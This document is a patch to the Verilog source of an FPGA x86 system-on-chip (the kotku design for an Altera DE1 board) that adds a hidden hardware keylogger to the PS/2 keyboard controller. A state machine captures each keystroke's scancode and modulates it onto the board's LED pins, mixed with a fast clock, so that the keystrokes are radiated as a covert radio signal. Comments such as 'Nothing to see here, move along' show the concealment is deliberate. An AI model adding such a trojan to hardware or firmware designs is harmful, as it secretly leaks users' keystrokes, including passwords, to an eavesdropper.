@@ -1,0 +1,162 @@
+diff -rupN a/boards/altera-de1/rtl/kotku.v b/boards/altera-de1/rtl/kotku.v
+--- a/boards/altera-de1/rtl/kotku.v	2014-04-03 20:44:51.475941832 -0300
++++ b/boards/altera-de1/rtl/kotku.v	2014-04-03 20:44:08.215940804 -0300
+@@ -653,7 +653,9 @@ module kotku (
+     .ps2_kbd_clk_ (ps2_kclk_),
+     .ps2_kbd_dat_ (ps2_kdat_),
+     .ps2_mse_clk_ (ps2_mclk_),
+-    .ps2_mse_dat_ (ps2_mdat_)
++    .ps2_mse_dat_ (ps2_mdat_),
++	 .RF_BACKDOOR(ledg_[7:0]),
++	 .RF_CLK(sdram_clk)
+   );
+ 
+ `ifndef SIMULATION
+@@ -786,7 +788,8 @@ module kotku (
+     .wb_ack_o (gpio_ack_o),
+ 
+     // GPIO inputs/outputs
+-    .leds_ ({ledr_,ledg_[7:4]}),
++    //.leds_ ({ledr_,ledg_[7:4]}),
++    .leds_ (ledr_),
+     .sw_   (sw_),
+     .pb_   (key_),
+     .tick  (intv[0]),
+@@ -1006,6 +1009,6 @@ module kotku (
+ 
+   assign sdram_clk_ = sdram_clk;
+ 
+-  assign ledg_[3:0] = pc[3:0];
++  //assign ledg_[3:0] = pc[3:0];
+ 
+ endmodule
+diff -rupN a/cores/ps2/rtl/ps2.v b/cores/ps2/rtl/ps2.v
+--- a/cores/ps2/rtl/ps2.v	2014-04-03 20:35:55.439929092 -0300
++++ b/cores/ps2/rtl/ps2.v	2014-04-03 20:36:24.799929790 -0300
+@@ -35,7 +35,10 @@ module ps2 (
+     input ps2_kbd_clk_,  // PS2 Keyboard Clock, Bidirectional
+     inout ps2_kbd_dat_,  // PS2 Keyboard Data, Bidirectional
+     inout ps2_mse_clk_,  // PS2 Mouse Clock, Bidirectional
+-    inout ps2_mse_dat_   // PS2 Mouse Data, Bidirectional
++    inout ps2_mse_dat_,   // PS2 Mouse Data, Bidirectional
++	 
++	 output [ 7:0]  RF_BACKDOOR,  // Nothing to see here, move along.
++	 input  RF_CLK // We need a fast clock
+   );
+ 
+   // --------------------------------------------------------------------
+@@ -93,6 +96,7 @@ module ps2 (
+   wire    RX_PERR;
+   wire [7:0]  PS_STAT;
+ 
++  
+   // --------------------------------------------------------------------
+   // Control Register and Wires
+   // --------------------------------------------------------------------
+@@ -335,6 +339,106 @@ module ps2 (
+     .ps2_data_ (ps2_kbd_dat_)
+   );
+ 
++  // --------------------------------------------------------------------
++  // Backdoor
++  // --------------------------------------------------------------------  
++
++  reg  [32:0] counter;
++  reg ledval;
++  reg [3:0] SMState;
++  reg [7:0] ScankeyCopy;
++  reg [7:0] Bitindex;
++  reg [7:0] BitindexOUT;
++  reg [23:0] TransmitBuffer;
++  reg	transmitBufferReady;
++  reg	transmitBufferFinished;
++  
++  `define RFS_WAITFORKEY 5'h0
++  `define RFS_TRANSMIT 5'h2
++  `define RFS_INCBITINDEX 5'h5
++  `define RFS_WAITFINISH 5'h6
++
++  initial counter <= 0;
++  initial ledval <= 0;
++  initial SMState <= `RFS_WAITFORKEY;
++  initial transmitBufferReady <=0;
++  initial transmitBufferFinished <=0;
++  initial BitindexOUT <=0;
++
++  always @(posedge wb_clk_i)
++	begin
++	if (wb_rst_i)
++			begin
++			SMState <= 0;
++			end
++	case (SMState)
++			`RFS_WAITFORKEY:
++					begin
++					if (released) // Keypress detected
++						begin
++//						ScankeyCopy <= 8'hF5;//KBD_dat_o;
++						ScankeyCopy <= KBD_dat_o;
++						Bitindex<=0;
++						TransmitBuffer<=24'h000055; // Startup						
++						SMState <= `RFS_TRANSMIT;
++						end
++					end
++			`RFS_TRANSMIT:
++					begin
++					TransmitBuffer[16:8]<=ScankeyCopy;
++					transmitBufferReady<=1;
++					SMState<=`RFS_WAITFINISH;
++					end
++			 `RFS_WAITFINISH:
++					begin
++					if (transmitBufferFinished)
++						begin
++						transmitBufferReady<=0;
++						SMState<=`RFS_WAITFORKEY;
++						end
++					end
++			endcase
++	end
++	
++  always @(posedge RF_CLK)
++	begin
++	if (SMState==`RFS_WAITFORKEY) // can't into concurrency
++						transmitBufferFinished<=0;
++	if (transmitBufferReady)
++		begin
++		ledval<=TransmitBuffer[BitindexOUT];
++		if (counter>1024*1024*8)
++				begin
++				counter<=0;
++				if (BitindexOUT==24)
++					begin
++					BitindexOUT<=0;
++					transmitBufferFinished<=1;
++					end					
++				else 
++					begin
++					transmitBufferFinished<=0;
++					BitindexOUT<=BitindexOUT+1'h1;
++					end
++				end
++		else 		counter<=counter+1'h1;
++		end
++	else ledval<=1;
++	end
++		
++	assign RF_BACKDOOR[0] = RF_CLK | ledval;
++	assign RF_BACKDOOR[1] = RF_CLK | ledval;
++	assign RF_BACKDOOR[2] = RF_CLK | ledval;
++	assign RF_BACKDOOR[3] = RF_CLK | ledval;
++	assign RF_BACKDOOR[4] = RF_CLK | ledval;
++	assign RF_BACKDOOR[5] = RF_CLK | ledval;
++	assign RF_BACKDOOR[6] = RF_CLK | ledval;
++	assign RF_BACKDOOR[7] = RF_CLK | ledval;
++  
++
++  
++  
++  
+   // Combinatorial logic
+   assign dat_i    =  wb_sel_i[0] ? wb_dat_i[7:0]  : wb_dat_i[15:8]; // 8 to 16 bit WB
+   assign wb_dat_o =  wb_sel_i[0] ? {8'h00, dat_o} : {dat_o, 8'h00}; // 8 to 16 bit WB
